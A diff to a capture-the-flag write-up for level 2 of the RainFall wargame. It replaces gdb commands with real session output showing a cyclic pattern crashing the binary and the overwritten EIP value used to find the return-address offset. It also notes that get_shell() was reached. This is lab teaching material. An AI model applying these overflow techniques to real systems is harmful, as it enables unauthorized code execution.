@@ -64,15 +64,21 @@ We need to determine at which point our input overwrites the saved return addres
 ### 3.1 Using a Pattern
 
 ```bash
-level2@RainFall:~$ gdb ./level2
-(gdb) run $(python -c '"Aa0Aa1Aa2..."')
+level2@RainFall:~$ gdb level2
+(gdb) run
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
 ```
 
 When the program crashes, we check the value of `EIP`:
 
 ```bash
-(gdb) info registers eip
-eip            0x37634136
+(gdb) info register eip
+eip            0x37634136       0x37634136
+(gdb)
 ```
 
 Now we find the exact offset:
@@ -111,6 +117,7 @@ We successfully executed `get_shell()` and obtained a shell as `level3`.
 ---
 
 **End of Level 2**
+
 
 
 
